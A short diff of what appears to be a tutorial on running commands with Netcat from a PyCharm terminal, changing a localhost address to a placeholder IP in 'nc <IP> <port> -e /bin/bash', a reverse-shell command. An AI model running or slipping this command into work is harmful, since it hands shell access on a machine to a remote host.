@@ -65,7 +65,7 @@ You can also use Netcat to execute commands directly from a Linux terminal.
 3. Then enter the following command in the PyCharm terminal:
 
    ```sh
-   nc 127.0.0.1 <port> -e /bin/bash
+   nc <IP> <port> -e /bin/bash
    ```
 5. Press Enter to establish the connection.
 
